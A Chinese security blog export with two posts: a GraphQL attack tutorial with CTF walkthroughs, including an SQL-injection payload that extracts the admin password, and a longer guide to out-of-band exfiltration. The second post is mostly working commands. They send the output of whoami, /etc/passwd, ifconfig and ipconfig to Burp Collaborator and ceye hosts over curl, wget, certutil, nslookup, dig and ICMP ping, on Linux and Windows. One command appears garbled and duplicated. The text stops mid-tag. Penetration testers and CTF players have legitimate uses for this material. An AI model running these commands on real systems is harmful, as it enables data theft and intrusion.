title="信息泄露"></a>信息泄露</h1><p>通过内省查询，我们可以得到很多后端接口的信息。有了这些信息通过排查便可能发现更多的安全问题，比如信息泄露。<br>查询存在的类型：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721031832-bc64e985-25a7-4973-a444-a091b0981067.png" alt="f4ff5867e655f8a9f5f6a16d2962fbcb.png"><br> 查询类型所有的字段：<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721050225-ac282716-4931-4078-946e-d56c15879ebe.png" alt="0e0e9ce978095d30a0ee822632c377b3.png"><br>在查找字段里是否包含一些敏感字段：<br>Email、token、password、authcode、license、key、session、secretKey、uid、address等。<br>除此以外还可以搜索类型中是否有edit、delete、remove、add等功能，来达到数据编辑、删除、添加的功能。<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721072426-2679efb7-eb2f-499e-8157-1abfef751e8a.png" alt="b3c7e4cea45cb7a277d4caf5c1ced24e.png"></p><h1 id="进入sql注入"><a href="#进入sql注入" class="headerlink" title="进入sql注入"></a>进入sql注入</h1><p> graphql的sql注入与一般的sql注入类似，都是可以通过构造恶意语句达到注入获取数据或改变查询逻辑的目的<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667720031540-be394278-36d8-4175-a0fa-2e7ee356c79e.png" alt="48a153df3e0d941632643de526417093.png"><br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667720041854-443c7a0a-aa2b-4ac0-b1c8-d600b798ce18.png" alt="c9c5ced48d8363e287de237d970eae7e.png"><br> 只有直接使用graphql进行查询才会出现的问题，正确的使用参数化查询，不会遇到sql注入的问题。 </p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>burp插件<br><a href="https://github.com/doyensec/inql">https://github.com/doyensec/inql</a><br>Express-GraphQL Endpoint CSRF漏洞<br>在Express-GraphQL中存在CSRF漏洞。如果将Content-Type修改为application/x-www-form-urlencoded ，再将POST请求包内容URL编码并生成csrf poc 即可实施csrf攻击，对敏感操作如mutation（变更）造成危害。<br>大概就是：默认graphql查询时，都是依赖于json数据格式进行传输给后端的，但是使用Express-GraphQL的时候，给json转换成form表单格式的数据也可以提交给后端正常处理，也就可以直接用burp生成的CSRF POC进行CSRF攻击了</p><pre><code class="plsql">原数据包：POST /? HTTP/1.1Host: graphqlapp.herokuapp.comOrigin: https://graphqlapp.herokuapp.comUser-Agent: Graphiql/httpReferer: https://graphqlapp.herokuapp.com/Cookie: [mask]Content-Type: application/jsonContent-Length: 108&#123;&quot;query&quot;:&quot;mutation &#123;\n editProfile(name:\&quot;hacker\&quot;, age: 5) &#123;\n name\nage\n &#125;\n&#125;&quot;,&quot;variables&quot;:null&#125;修改后也能使用的数据包：POST /? HTTP/1.1Host: graphqlapp.herokuapp.comOrigin: https://graphqlapp.herokuapp.comUser-Agent: Graphiql/httpReferer: https://graphqlapp.herokuapp.com/Cookie: [mask]Content-Type: application/x-www-form-urlencodedContent-Length: 138query=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%205)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D</code></pre><p>  修复方式可以考虑将CORS配置为仅允许来自受信任域的白名单的请求，或者确保正在使用CSRF令牌.实施多种保护将降低成功攻击的风险.  </p><h1 id="嵌套查询拒绝服务"><a href="#嵌套查询拒绝服务" class="headerlink" title="嵌套查询拒绝服务"></a>嵌套查询拒绝服务</h1><p> 当业务的变量互相关联，如以下graphql定义为这样时，就可能无限展开，造成拒绝服务。  </p><pre><code class="plsql">type Thread &#123;  messages(first: Int, after: String): [Message]&#125;</code></pre><pre><code class="plsql">type Message &#123;  thread: Thread&#125;</code></pre><pre><code class="plsql">type Query &#123;  thread(id: ID!): Thread&#125;</code></pre><p>默认情况下，GraphQL 中的所有类型都是可为空的；空值是上述所有类型的有效响应。要声明不允许 null 的类型，可以使用 GraphQL Non?Null 类型。此类型包装基础类型，并且此类型的行为与该包装类型相同，但 null 不是包装类型的有效响应。尾随感叹号用于表示使用 Non?Null 类型的字段，如下所示：name: String!。<br>换句话说，GraphQL 中的类型默认可以为空。类型后的感叹号专门指定该类型为不可为空。<br>就有可能存在拒绝服务的风险。<br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721590946-361ce721-3ed2-49cf-8854-2d236bbb7b64.png" alt="image.png"><br> 修复方式可以考虑增加深度限制，使用graphql-depth-limit模块查询数量限制；或者使用graphql-input-number创建一个标量，设置最大为100  </p><h1 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h1><p> graphql本身建议由业务层做权限控制，graphql作为一个单路由的API接口完成数据查询操作。开发者在使用时经常会忽略接口的鉴权问题。有时候客户端调用查询接口，直接传入了id等信息并未做好权限校验，就有可能存在水平越权  <img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721666095-3645112b-a1ad-442c-83f3-9dc03dc41c9b.png" alt="284177284d3f098468827b8ffd745162.png"><br><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667721670294-8c48d534-af32-43d5-a26e-e3641a2e4c8d.png" alt="f6e974c205db0a29f17de74ab4fe5ee9.png"><br> 修复方式建议在GraphQL和数据之间多加一个权限校验层，或者由业务自行实现权限校验。  </p><h1 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h1><h2 id="corCTT2021-devme"><a href="#corCTT2021-devme" class="headerlink" title="corCTT2021 devme"></a>corCTT2021 devme</h2><p><img src="/2022/11/22/GraphQL%E6%B3%A8%E5%85%A5/1667723151532-f6d37fe9-d7b0-46e8-bed6-7f923b88c3d7.png" alt="devme-1.png"><br>随便输入一个email</p><pre><code class="plsql">POST /graphql HTTP/1.1Content-Type: application/json&#123;    &quot;query&quot;: &quot;mutation createUser($email: String!) &#123;\n\tcreateUser(email: $email) &#123;\n\t\tusername\n\t&#125;\n&#125;\n&quot;,    &quot;variables&quot;: &#123;        &quot;email&quot;: &quot;test@test.com&quot;    &#125;&#125;</code></pre><p>尝试内省查询</p><pre><code class="plsql">&#123;    __schema &#123;        types &#123;            name        &#125;    &#125;&#125;</code></pre><p>返回包</p><pre><code class="plsql">&#123;    &quot;data&quot;: &#123;        &quot;__schema&quot;: &#123;            &quot;types&quot;: [                &#123;                    &quot;name&quot;: &quot;Query&quot;                &#125;,                ... lots of default types                &#123;                    &quot;name&quot;: &quot;User&quot;                &#125;            ]        &#125;    &#125;&#125;</code></pre><p>我们来查询一下User类型</p><pre><code class="plsql">&#123;    __type(name: &quot;User&quot;) &#123;        fields &#123;            name        &#125;    &#125;&#125;</code></pre><pre><code class="plsql">&#123;    &quot;data&quot;: &#123;        &quot;__type&quot;: &#123;            &quot;fields&quot;: [                &#123;                    &quot;name&quot;: &quot;token&quot;                &#125;,                &#123;                    &quot;name&quot;: &quot;username&quot;                &#125;            ]        &#125;    &#125;&#125;</code></pre><p>我们先来看下哪些查询是被支持的</p><pre><code class="plsql">&#123;    __type(name: &quot;Query&quot;) &#123;        fields &#123;            name        &#125;    &#125;&#125;</code></pre><pre><code class="plsql">&#123;    &quot;data&quot;: &#123;        &quot;__type&quot;: &#123;            &quot;fields&quot;: [                &#123;                    &quot;name&quot;: &quot;users&quot;                &#125;,                &#123;                    &quot;name&quot;: &quot;flag&quot;                &#125;            ]        &#125;    &#125;&#125;</code></pre><p>我们在里面发现了flag,试着查询一下</p><pre><code class="plsql">&#123;    flag&#125;</code></pre><pre><code class="plsql">&#123;    &quot;errors&quot;: [        &#123;            &quot;message&quot;: &quot;Field \&quot;flag\&quot; argument \&quot;token\&quot; of type \&quot;String!\&quot; is required, but it was not provided.&quot;,            &quot;locations&quot;: [                &#123;                    &quot;line&quot;: 1,                    &quot;column&quot;: 2                &#125;            ]        &#125;    ]&#125;</code></pre><p>结果就是我们不能查询，我们需要提供token的值，那让我们查询下User里的token</p><pre><code class="plsql">&#123;    users &#123;        username        token    &#125;&#125;</code></pre><pre><code class="plsql">&#123;    &quot;data&quot;: &#123;        &quot;users&quot;: [            &#123;                &quot;username&quot;: &quot;admin&quot;,                &quot;token&quot;: &quot;3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b&quot;            &#125;,&#123;                &quot;username&quot;: &quot;b82d9af8a6226c072bcd811e7a009ffb36b2ad88be67ac396d170fe8e2f1de7c&quot;,                &quot;token&quot;: &quot;5568f87dc1ca15c578e6b825ffca7f685ac433c1826b075b499f68ea309e79a6&quot;            &#125;            ... more users        ]    &#125;&#125;</code></pre><p>我们使用admin的token去获得flag</p><pre><code class="plsql">&#123;    flag(token: &quot;3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b&quot;)&#125;</code></pre><pre><code class="plsql">&#123;    &quot;data&quot;: &#123;        &quot;flag&quot;: &quot;&quot;    &#125;&#125;</code></pre><h2 id="祥云杯2022-Funweb"><a href="#祥云杯2022-Funweb" class="headerlink" title="祥云杯2022 Funweb"></a>祥云杯2022 Funweb</h2><p>前面用到的jwt漏洞是这个CVE-2022-39227，这里就不提及，主要看graohQL注入<br>还是先内省查询</p><pre><code class="plsql">&#123;    __schema &#123;        types &#123;            name        &#125;    &#125;&#125;</code></pre><p>回显</p><pre><code class="plsql">&#123;&#39;__schema&#39;:    &#123;&#39;types&#39;: [&#123;&#39;name&#39;: &#39;Query&#39;&#125;,              &#123;&#39;name&#39;: &#39;Getscorebyname&#39;&#125;,             &#123;&#39;name&#39;: &#39;String&#39;&#125;,             &#123;&#39;name&#39;: &#39;Getscorebyid&#39;&#125;,             &#123;&#39;name&#39;: &#39;Int&#39;&#125;,             &#123;&#39;name&#39;: &#39;Boolean&#39;&#125;,             &#123;&#39;name&#39;: &#39;__Schema&#39;&#125;,             &#123;&#39;name&#39;: &#39;__Type&#39;&#125;,             &#123;&#39;name&#39;: &#39;__TypeKind&#39;&#125;,             &#123;&#39;name&#39;: &#39;__Field&#39;&#125;,             &#123;&#39;name&#39;: &#39;__InputValue&#39;&#125;,             &#123;&#39;name&#39;: &#39;__EnumValue&#39;&#125;,             &#123;&#39;name&#39;: &#39;__Directive&#39;&#125;,             &#123;&#39;name&#39;: &#39;__DirectiveLocation&#39;&#125;]&#125;&#125;</code></pre><p>再查询Getscorebyid</p><pre><code class="plsql">&#123; Getscorebyid(id: 1)    &#123;         id         name         score &#125;&#125;</code></pre><p>  回显:</p><pre><code class="plsql">&#123;    &#39;getscoreusingid&#39;:             &#123;                    &#39;id&#39;: &#39;1&#39;,                     &#39;name&#39;: &#39;admin&#39;,                     &#39;score&#39;: &#39;100&#39;            &#125;&#125;# 这里用getscorebyid不行，故改为getscoreusingid</code></pre><p>然后获取字段:</p><pre><code class="plsql">&#123;  __type (name: &quot;Getscorebyid&quot;) &#123;    name    fields &#123;      name      type &#123;        name        kind        ofType &#123;          name          kind        &#125;      &#125;    &#125;  &#125;&#125;</code></pre><p>最后拿管理员密码的paylaod</p><pre><code class="plsql">&#123;     getscoreusingnamehahaha(name:&quot;admin&#39;union select password from users where name=&#39;admin&#39; and &#39;1&#39;=&#39;1&quot;)    &#123;                   name                 score     &#125;&#125;</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.secpulse.com/archives/148242.html">https://www.secpulse.com/archives/148242.html</a><br><a href="https://blog.csdn.net/weixin_34080903/article/details/89390255">https://blog.csdn.net/weixin_34080903/article/details/89390255</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GraphQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OOB外带攻击</title>
      <link href="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/"/>
      <url>/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="对内攻击"><a href="#对内攻击" class="headerlink" title="对内攻击"></a>对内攻击</h2><p>在一次攻击当中,只有一条通道，属于in-band（带内）攻击，我们常见的攻击类型就是这种类型，大多数的攻击都属于带内攻击，在一条通信通道内进行的攻击。<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665493942514-f4c248c0-0602-43e7-80d2-9ced56ad72db.png" alt="image.png"></p><h2 id="对外攻击"><a href="#对外攻击" class="headerlink" title="对外攻击"></a>对外攻击</h2><p>但是有的时候我们的攻击也可能不在一条通道上，同一次攻击下，不止一条信道，则属于out-band（带外）攻击，由我们的一端向服务器发送请求，让服务器执行我们请求中的向另外一个公网的请求<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665493992376-c096cc51-f3aa-4874-a946-7515110a80ed.png" alt="image.png"></p><h2 id="盲"><a href="#盲" class="headerlink" title="盲"></a>盲</h2><p><strong>程序不进行详细的回显信息，而只是返回对或者错时，我们都可以叫它盲</strong>。我们在做<a href="https://cloud.tencent.com/product/wpt?from=10680">渗透测试</a>的时候，经常会遇到这种情况，测试跨站可能有些功能插入恶意脚本后无法立即触发，例如提交反馈表单，需要等管理员打开查看提交信息时才会触发，或者是盲注跨站，盲打 XSS 这种。再例如 SSRF，如果程序不进行回显任何信息，而只提示你输入的是否合法，那么也无法直接判断程序存在 SSRF 漏洞，我们可以叫盲 SSRF。再例如 XXE，引入外部文件时，如果程序也不返回任何信息和引用文件的内容，而只提示输入的是否有误，那么也无法直接判断程序是否存在 XXE 漏洞，我们也可以叫盲 XXE。<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665494309999-5c046ff8-2199-4632-a876-c973f64bfef4.png" alt="image.png"></p><h1 id="基本回显思路"><a href="#基本回显思路" class="headerlink" title="基本回显思路"></a>基本回显思路</h1><h2 id="对于出网机器"><a href="#对于出网机器" class="headerlink" title="对于出网机器"></a>对于出网机器</h2><p><strong>使用http传输，如wget，curl，certutil将回显信息爬出</strong><br>** 优点：**方便，回显全。</p><p>** 缺点：**1.对于不出网服务器没有办法传输，同时需要了解其返回包字段信息，需要使用返回包字段将回显信息带出</p><h2 id="对于不出网机器"><a href="#对于不出网机器" class="headerlink" title="对于不出网机器"></a>对于不出网机器</h2><p><strong>使用DNS传输，ICMP传输，powershell中的wget，curl等传输</strong><br>** 优点：**不出网机器可以传输</p><p>**  缺点：**1.回显是一条条执行，需要将回显结果拼接解码，回显信息比较麻烦<br>2.短回显可以使用DNS传输，长回显大部分带出需要powershell搭配，但杀毒软件往往禁用powershell，因此利用条件较苛刻</p><h2 id="burpsuit-Collaborator-Client模块回显"><a href="#burpsuit-Collaborator-Client模块回显" class="headerlink" title="burpsuit Collaborator Client模块回显"></a><strong>burpsuit Collaborator Client模块回显</strong></h2><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665498456481-fbab1c32-ed54-45d1-8dc7-768384d85b5f.png" alt="image.png"><br>点击复制一下由burp生成的二级域名地址<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665498493742-96ec077b-0db2-4c69-b38b-5d88dd35ba41.png" alt="image.png"><br>和在线网站的用法其实都差不多,这里就不过多赘述</p><pre><code class="php">//httpcurl `whoami`.u725dozxmas6ru7honh9r8flmcs3gs.burpcollaborator.netcurl u725dozxmas6ru7honh9r8flmcs3gs.burpcollaborator.net/`whoami`//dnsping `whoami`.u725dozxmas6ru7honh9r8flmcs3gs.burpcollaborator.net</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665499156367-f822781b-dcff-456f-823d-ec8ebfe5c66b.png" alt="image.png"></p><h2 id="Linux-在线网站DNS-HTTP管道解析"><a href="#Linux-在线网站DNS-HTTP管道解析" class="headerlink" title="(Linux)在线网站DNS/HTTP管道解析"></a><strong>(Linux)在线网站DNS/HTTP管道解析</strong></h2><p>经常在拿下shell的时候碰到命令执行无回显的情况，因此为了解决命令执行无回显时，可以借助DNS管道解析来让命令回显<br>在线网站有<a href="http://dnslog.cn/">dnslog</a>和<a href="http://ceye.io/">ceye</a></p><h3 id="HTTP带外攻击"><a href="#HTTP带外攻击" class="headerlink" title="HTTP带外攻击"></a>HTTP带外攻击</h3><p>linux可以使用以下方法：</p><h4 id="通过curl远程命令执行RCE"><a href="#通过curl远程命令执行RCE" class="headerlink" title="通过curl远程命令执行RCE"></a>通过curl远程命令执行RCE</h4><h5 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h5><pre><code class="php">通过http记录查看是否执行（最好执行两次），curl走http协议curl XXX.ceye.io/`whoami`curl `whoami`.XXX.ceye.io</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665495542386-666d7faa-efd7-4deb-8cde-9dd81383aa59.png" alt="image.png"><br>我分别执行了whoami和cat /etc/passwd命令<br>效果也能明显，但是当数据较多时，只回显了第一条数据<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665495602469-9d322896-4297-4174-aa29-7ecc02a375be.png" alt="image.png"></p><h5 id="如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的"><a href="#如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的" class="headerlink" title="如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的"></a>如果回显信息不全，可以使用如下结合sed命令令回显完整，但其实也不是全的</h5><pre><code class="php">curl XXX.ceye.io/`ls -al|sed -n &#39;2p&#39;` //这里回显的就是第二行数据了</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665495827542-f8cd7de4-7f6e-434b-91e1-af154afbaa21.png" alt="image.png"></p><h5 id="使用base64传输"><a href="#使用base64传输" class="headerlink" title="使用base64传输"></a>使用base64传输</h5><pre><code class="php">curl XXX.ceye.io/`ls -al|sed -n &#39;2p&#39;|base64`   </code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665495978518-7628cd8a-baf8-4ff0-9b81-14198b4f3a11.png" alt="image.png"></p><h5 id="有的时候长度太大，cut来分割字符-第一个字符下标为1"><a href="#有的时候长度太大，cut来分割字符-第一个字符下标为1" class="headerlink" title="有的时候长度太大，cut来分割字符(第一个字符下标为1)"></a>有的时候长度太大，cut来分割字符(第一个字符下标为1)</h5><pre><code class="php">curl XXX.ceye.io/`ls -al |cut -c 3-10`</code></pre><h4 id="wget传输"><a href="#wget传输" class="headerlink" title="wget传输"></a>wget传输</h4><p><strong>使用wget将命令回显信息通过包头数据字符串User-Agent传输至攻击服务器上，xargs echo–n代表去掉各个分隔符，换行符等符号输出</strong></p><pre><code class="php">wget --header=&quot;HY:`cat /etc/passwd | xargs echo –n`&quot; zqtpylwvynwgaxifh1kfjquhn8t5hu.burpcollaborator.net</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665681959294-c266f596-ad7f-494d-8789-88f7fbbb6e9d.png" alt="image.png"><br>查看访问记录<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665681982982-db081893-ec22-4504-ac3c-311a9315ebd3.png" alt="image.png"></p><h3 id="dns带外攻击"><a href="#dns带外攻击" class="headerlink" title="dns带外攻击"></a>dns带外攻击</h3><h4 id="单条信息"><a href="#单条信息" class="headerlink" title="单条信息"></a>单条信息</h4><p><strong>通过DNS记录查看是否执行（最好执行两次），ping走的是DNS协议</strong></p><pre><code class="php">ping `whoami`.XXXX.ceye.io</code></pre><p>这里也可以用网站dnslog<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665496640653-19614883-8ea1-4bca-9243-1ea1293e2d7a.png" alt="image.png"><br>但是也只有第一条数据,只适合单条的短信息回显</p><h4 id="base64进行多条信息"><a href="#base64进行多条信息" class="headerlink" title="base64进行多条信息"></a>base64进行多条信息</h4><pre><code class="php">var=11111 &amp;&amp; for i in $(ifconfig|base64|awk &#39;&#123;gsub(/.&#123;50&#125;/,&quot;&amp;\n&quot;)&#125;1&#39;); do var=$((var+1)) &amp;&amp; nslookup $var.$i.402c35vpn9hpplp9ilj09pxx9ofe33.burpcollaborator.net; done</code></pre><p>如果找不到nslookup命令<br>使用命令安装</p><pre><code class="php">yum -y install bind-utils</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680141774-bb8bb6ac-3917-402a-a4f7-3475c12e6da8.png" alt="image.png"><br>将base64一条条解码即可<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680150290-edc7e652-0622-4a10-9cab-0c457e63afe2.png" alt="image.png"></p><h4 id="16进制传输"><a href="#16进制传输" class="headerlink" title="16进制传输"></a>16进制传输</h4><pre><code class="php">var=11111 &amp;&amp; for b in $(ifconfig|xxd -p ); do var=$((var+1)) &amp;&amp; dig $var.$b.var=11111 &amp;&amp; for b in $(ifconfig|xxd -p ); do var=$((var+1)) &amp;&amp; dig $var.$b.ezh4705a725vjcruqgtus53wwn2hq6.burpcollaborator.net; done; done</code></pre><p>如果找不到xxd命令<br>使用:</p><pre><code class="php">yum install vim-common</code></pre><p>来安装<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680505374-362ac081-08bc-47e0-80d5-854195f69fef.png" alt="image.png"><br>在burp中可以看到<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680486320-70e0ef60-a251-4fe8-84fd-2f19d4dbfc82.png" alt="image.png"><br>一行行复制查看即可，结果还算准确<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665680468991-273879c2-4f23-4a59-9cf3-072479341360.png" alt="image.png"></p><h4 id="ICMP传输"><a href="#ICMP传输" class="headerlink" title="ICMP传输"></a>ICMP传输</h4><pre><code class="php">linux靶机cat /etc/passwd | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 easn1l1elxy8t7azlztz02gkbbh65v.burpcollaborator.net;done攻击者sudo tcpdump &#39;icmp and src host 202.14.120.xx&#39; -w icmp_file.pcap#To capture攻击者提取数据echo &quot;0x$(tshark -n -q -r icmp_file.pcap -T fields -e data.data | tr -d &#39;\n&#39; | tr -d &#39;:&#39;)&quot; | xxd -r -p   #Or Use Wireshark gui</code></pre><h2 id="windows系统外带"><a href="#windows系统外带" class="headerlink" title="windows系统外带"></a>windows系统外带</h2><h3 id="http传输"><a href="#http传输" class="headerlink" title="http传输"></a>http传输</h3><h4 id="curl传输"><a href="#curl传输" class="headerlink" title="curl传输"></a>curl传输</h4><pre><code class="php">windows中 %xxx% 的xxx代表系统变量,常用系统变量命令              %SystemDrive%                                     系统安装的磁盘分区              %SystemRoot% = %Windir% WINDODWS                  系统目录              %ProgramFiles%　                                  应用程序默认安装目录              %AppData%                                         应用程序数据目录              %CommonProgramFiles%                              公用文件目录              %HomePath%                                        当前活动用户目录              %Temp% =%Tmp%                                     当前活动用户临时目录              %DriveLetter%                                     逻辑驱动器分区              %HomeDrive%                                       当前用户系统所在分区</code></pre><p><strong>curl抓取用户名：//</strong>%USERNAME%，列出所有用户名</p><pre><code class="php">curl http://x75kydmzeqh0o6g5srhxz2joofu8ix.burpcollaborator.net/%USERNAME%</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665906863933-a53b3205-a5f8-4fd1-8598-e6145c5d02a4.png" alt="image.png"><br><strong>curl获取windows安装目录：</strong>//%WinDir%，列出windows的安装目录</p><pre><code class="php">curl http://x75kydmzeqh0o6g5srhxz2joofu8ix.burpcollaborator.net/%WinDir%</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665906919432-fd128314-4070-41fd-bc0a-40207e4c85ad.png" alt="image.png"></p><h4 id="certutil利用"><a href="#certutil利用" class="headerlink" title="certutil利用"></a>certutil利用</h4><p>将ipconfig的结果记录在新建temp文件中，再对temp文件进行base64加密变成temp2文件，再对temp2文件中的多余字符”CERTIFICATE”删掉变成temp3，再对temp3的内容删除换行符生成所有数据只在一行的temp4（因为http响应包想要信息全部输出必须使信息全在一行），并把temp4的内容赋予变量为p1，最后使用curl爬取p1的值赋予http响应包的User-Agent字段输出于http:// qysvrrmxvestl2c93ydg0u5p1g76vv.burpcollaborator.net中，最后删除本地文件夹中所有生成的带有temp字段的文件（也就是之前生成的temp~temp4四个文件）</p><pre><code class="php">ipconfig &gt; temp &amp;&amp; certutil -f -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; (for /f %i in (./temp3) do set /p=%i&lt;nul &gt;&gt;temp4) || set /p pl=&lt;temp4 &amp;&amp; curl -H &quot;User-Agent:%pl%&quot; x75kydmzeqh0o6g5srhxz2joofu8ix.burpcollaborator.net &amp;&amp; del temp*</code></pre><p>数据在useragent里<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665907105337-f0ebfb0b-f735-4444-8f2d-6fd7d13f712c.png" alt="image.png"><br>解码即可<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665907126557-aff65172-de84-414f-9b9b-c2ae1751318c.png" alt="image.png"></p><h3 id="DNS传输"><a href="#DNS传输" class="headerlink" title="DNS传输"></a>DNS传输</h3><h4 id="dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）"><a href="#dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）" class="headerlink" title="dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）"></a>dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）</h4><pre><code class="php">for /L %i in (1,1,10) do nslookup    //执行10次nslookup命令cmd /v /c &quot;hostname &gt; temp &amp;&amp; certutil -f -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt;temp3 &amp;&amp; set FINAL=!MYVAR!.fq94atmnmopixkbqusvwe2s23t9jx8.burpcollaborator.net &amp;&amp; nslookup !FINAL!&quot;</code></pre><h4 id="十六进制传输：（hex）–缺点：必须调用powershell"><a href="#十六进制传输：（hex）–缺点：必须调用powershell" class="headerlink" title="十六进制传输：（hex）–缺点：必须调用powershell"></a>十六进制传输：（hex）–缺点：必须调用powershell</h4><pre><code class="php">whoami &gt; test &amp;&amp; certutil -encodehex -f test test.hex 4 &amp;&amp; powershell $text=Get-Content test.hex;$sub=$text -replace(&#39; &#39;,&#39;&#39;);$j=11111;foreach($i in $sub)&#123; $fin=$j.tostring()+&#39;.&#39;+$i+&#39;.xfgmzbb5b6e0m208jake3khksby2mr.burpcollaborator.net&#39;;$j += 1; nslookup $fin &#125;</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927157061-f835d131-24fd-45d4-8177-77ba8e15fe08.png" alt="image.png"><br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927167931-6bc8191b-53ad-4bdb-a9c7-2f9a98f99590.png" alt="image.png"><br>直接16进制转字符串即可<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927189900-4adb399f-06ed-4a01-98d0-7499428f8ee3.png" alt="image.png"></p><h4 id="通过win-r，直接输入-USERNAME-调用Burp地址来调用DNS解析记录"><a href="#通过win-r，直接输入-USERNAME-调用Burp地址来调用DNS解析记录" class="headerlink" title="通过win+r，直接输入%USERNAME%调用Burp地址来调用DNS解析记录"></a>通过win+r，直接输入%USERNAME%调用Burp地址来调用DNS解析记录</h4><p><strong>使用windows的win+r调出运行，再执行第二行代码，会调用DNS解析</strong></p><pre><code class="php">win+r\\%USERNAME%.0ijp2ee8e9h3p53bmdnh6nknve16pv.burpcollaborator.net</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927381636-f775b7db-a2f2-4451-be17-c2a84d198b0b.png" alt="image.png"></p><h4 id="ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）"><a href="#ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）" class="headerlink" title="ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）"></a>ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）</h4><pre><code class="php">whoami &gt; output.txt &amp;&amp; powershell $text=Get-Content output.txt;$ICMPClient = New-Object System.Net.NetworkInformation.Ping;$PingOptions = New-Object System.Net.NetworkInformation.PingOptions;$PingOptions.DontFragment = $True;$sendbytes = ([text.encoding]::ASCII).GetBytes($text);$ICMPClient.Send(&#39;rpkg95lzl0ouwwa2t4u8dere258ywn.burpcollaborator.net&#39;,60 * 1000, $sendbytes, $PingOptions);</code></pre><p><img 